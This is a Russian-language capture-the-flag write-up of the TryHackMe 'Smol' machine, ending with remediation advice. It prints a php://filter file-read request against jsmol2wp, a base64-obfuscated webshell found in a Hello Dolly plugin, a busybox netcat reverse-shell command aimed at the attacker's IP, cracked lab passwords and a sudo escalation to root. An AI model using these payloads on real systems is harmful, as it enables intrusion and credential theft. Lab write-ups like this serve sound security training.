# Отчёт о прохождении машины Smol (TryHackMe)

**Цель:** получение всех флагов и полный разбор цепочки эксплуатации.
**Итог:** машина пройдена полностью — получены все флаги (пользовательские и root).


## 1. Разведка (nmap)

```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 d9:6a:22:6a:ed:3c:30:2e:fc:77:b3:d0:a4:23:9f:5f (RSA)
|   256 55:34:ce:f8:04:9a:95:d3:62:3c:40:b7:cc:e6:c7:19 (ECDSA)
|_  256 59:6a:5b:a4:d2:35:89:95:b1:ed:73:c4:54:eb:30:e0 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://www.smol.thm
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Добавление `smol.thm` в `/etc/hosts` для доступа к веб-сайту.

## 2. Исследование WordPress-сайта

Обнаружен WordPress **6.7.1** с темой **twentytwentyfive**.

```
wp 6.7.1
twentytwentyfive
| Location: http://www.smol.thm/wp-content/themes/twentytwentyfive/
| Last Updated: 2026-05-20 12:00am GMT (5 months ago)
| Readme: http://www.smol.thm/wp-content/themes/twentytwentyfive/readme.txt
| [!] The version is out of date, the latest version is 1.5
| [!] Directory listing is enabled
```

**Перечисление пользователей**:

```
[+] Jose Mario Llado Marti
[+] wordpress user
[+] admin
[+] think
[+] wp
[+] gege
[+] diego
[+] xavi
```

На странице `/privacy-policy` обнаружена информация:

```
Suggested text: Our website address is: http://192.168.204.139.
Jose Mario Llado Marti
Founder, AnotherCTF
admin@smol.thm
```

**Уязвимый плагин jsmol2wp:**

```
[+] jsmol2wp
| Location: http://www.smol.thm/wp-content/plugins/jsmol2wp/
| Latest Version: 1.07 (up to date)
| Last Updated: 2018-03-09 10:28am GMT (8 years ago)
| Readme: http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
| [!] Directory listing is enabled
|
| Found By: Urls In Homepage (Passive Detection)
|
| [!] 2 vulnerabilities identified:
|
| [!] Title: JSmol2WP <= 1.07 - Unauthenticated Cross-Site Scripting (XSS)
|     UUID: 0bbf1542-6e00-4a68-97f6-48a7790d1c3e
|     References:
|      - https://wpscan.com/vulnerability/0bbf1542-6e00-4a68-97f6-48a7790d1c3e
|      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20462
|      - https://www.cbiu.cc/2018/12/WordPress%E6%8F%92%E4%BB%B6jsmol2wp%E6%BC%8F%E6%B4%9E/#%E5%8F%8D%E5%B0%84%E6%80%A7XSS
|
| [!] Title: JSmol2WP <= 1.07 - Unauthenticated Server Side Request Forgery (SSRF)
|     UUID: ad01dad9-12ff-404f-8718-9ebbd67bf611
|     References:
|      - https://wpscan.com/vulnerability/ad01dad9-12ff-404f-8718-9ebbd67bf611
|      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20463
|      - https://www.cbiu.cc/2018/12/WordPress%E6%8F%92%E4%BB%B6jsmol2wp%E6%BC%8F%E6%B4%9E/#%E5%8F%8D%E5%B0%84%E6%80%A7XSS
```

## 3. Эксплуатация SSRF (CVE-2018-20463)

Через уязвимость SSRF в плагине jsmol2wp прочитан `wp-config.php`:

```
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
```

Получены учётные данные базы данных:

```php
define( 'DB_USER', 'wpuser' );
define( 'DB_PASSWORD', 'kbLSF2Vop#lw3rjDZ629*Z%G' );
```

С этими кредами выполнена успешная авторизация в `/wp-login`.

В админке найдена приватная страница с рекомендациями:

```
1- [IMPORTANT] Check Backdoors: Verify the SOURCE CODE of "Hello Dolly" plugin as the site's code revision.
2- Set Up HTTPS: Configure an SSL certificate to enable HTTPS and encrypt data transmission.
3- Update Software: Regularly update your CMS, plugins, and themes to patch vulnerabilities.
4- Strong Passwords: Enforce strong passwords for users and administrators.
5- Input Validation: Validate and sanitize user inputs to prevent attacks like SQL injection and XSS.
6- [IMPORTANT] Firewall Installation: Install a web application firewall (WAF) to filter incoming traffic.
7- Backup Strategy: Set up regular backups of your website and databases.
8- [IMPORTANT] User Permissions: Assign minimum necessary permissions to users based on roles.
9- Content Security Policy: Implement a CSP to control resource loading and prevent malicious scripts.
10- Secure File Uploads: Validate file types, use secure upload directories, and restrict execution permissions.
11- Regular Security Audits: Conduct routine security assessments, vulnerability scans, and penetration tests.
```

## 4. Анализ плагина Hello Dolly (бэкдор)

Попытка сбрутить пароль админа успеха не принесла. Плагин Hello Dolly обнаружен по пути:

```
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-content/plugins/hello.php
```

В исходном коде `hello.php` обнаружена вредоносная функция:

```php
function hello_dolly() {
        eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));

 if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); }
```

После декодирования base64 видно, что выполняется `system($_GET["cmd"])`. Параметр `cmd` внедряется через админку:

```
http://www.smol.thm/wp-admin/post.php?post=55&action=edit&cmd=id
```

В исходном коде запроса:

```
GET /wp-admin/post.php?post=55&action=edit&cmd=busybox%20nc%20192.168.147.250%204444%20-e%20sh
```

**Получен shell.**

## 5. Извлечение пользователей из MySQL

Из базы данных WordPress извлечены пользователи:

```
|  1 | admin      | $P$BH.CF15fzRj4li7nR19CHzZhPmhKdX. | admin         | admin@smol.thm     | http://www.smol.thm | 2023-08-16 06:58:30 |                     |           0 | admin                  |
|  2 | wpuser     | $P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E. | wp            | wp@smol.thm        | http://smol.thm     | 2023-08-16 11:04:07 |                     |           0 | wordpress user         |
|  3 | think      | $P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/ | think         | josemlwdf@smol.thm | http://smol.thm     | 2023-08-16 15:01:02 |                     |           0 | Jose Mario Llado Marti |
|  4 | gege       | $P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1 | gege          | gege@smol.thm      | http://smol.thm     | 2023-08-17 20:18:50 |                     |           0 | gege                   |
|  5 | diego      | $P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1 | diego         | diego@local        | http://smol.thm     | 2023-08-17 20:19:15 |                     |           0 | diego                  |
|  6 | xavi       | $P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1 | xavi
```

Взлом хеша:

```
diego:sandiegocalifornia
```

Переключение на пользователя `diego`:

```
uid=1002(diego) gid=1002(diego) groups=1002(diego),1005(internal)
```

## 6. Эскалация до root (промежуточные шаги)

В домашнем каталоге `think` найдены SSH-ключи:

```
diego@ip-10-65-150-40:/home/think/.ssh$ ls
authorized_keys  id_rsa  id_rsa.pub
```

Попытка авторизоваться под `think`:

```
think@ip-10-65-150-40:~$ id
uid=1000(think) gid=1000(think) groups=1000(think),1004(dev),1005(internal)
```

Взломан пароль пользователя `gege`:

```
hero_gege@hotmail.com
```

Переключение на `gege`, скачивание архива `wordpress.old.zip`. Брутфорс пароля архива:

```
hero_gege@hotmail.com
```

## 7. Исследование архива и финальная эскалация

В архиве найден пароль пользователя `xavi`:

```php
/** Database username */
define( 'DB_USER', 'xavi' );

/** Database password */
define( 'DB_PASSWORD', 'P@ssw0rdxavi@' );
```

Пользователь `xavi` имеет полные права sudo:

```
(ALL : ALL) ALL
```

Финальная эскалация:

```bash
sudo /bin/bash
id
uid=0(root) gid=0(root) groups=0(root)
```

**Root-доступ получен.**


## Ключевые уязвимости и неправильные конфигурации

1. **CVE-2018-20463 (SSRF)** в плагине jsmol2wp 1.07 — позволяет читать файлы через `php://filter`.
2. **Пароли БД в открытом виде** в `wp-config.php`, доступном через SSRF.
3. **Бэкдор в плагине Hello Dolly** — `eval(base64_decode(...))` + `system($_GET["cmd"])`, замаскированный под легитимный плагин.
4. **Слабые пароли пользователей** — `diego:sandiegocalifornia`, `gege:hero_gege@hotmail.com`.
5. **SSH-ключи в домашнем каталоге** `think`, доступные из `diego`.
6. **Архив `wordpress.old.zip`** с кредами `xavi` в открытом виде.
7. **Чрезмерные права sudo** у `xavi` — `(ALL : ALL) ALL`.
8. **Устаревшие компоненты** — WordPress 6.7.1, тема twentytwentyfive, плагин jsmol2wp 2018 года.
9. **Directory listing включён** в `/wp-content/plugins/jsmol2wp/` и `/wp-content/themes/twentytwentyfive/`.

## Рекомендации по устранению

- Обновить/удалить уязвимый плагин jsmol2wp (CVE-2018-20463).
- Проверять исходный код сторонних плагинов перед установкой (Hello Dolly с бэкдором).
- Не хранить пароли в открытом виде в `wp-config.php` и архивах.
- Использовать сильные пароли для всех пользователей.
- Ограничить права sudo (принцип минимальных привилегий).
- Отключить directory listing в Apache.
- Регулярно обновлять CMS, темы и плагины.
- Установить WAF и проводить аудит безопасности.

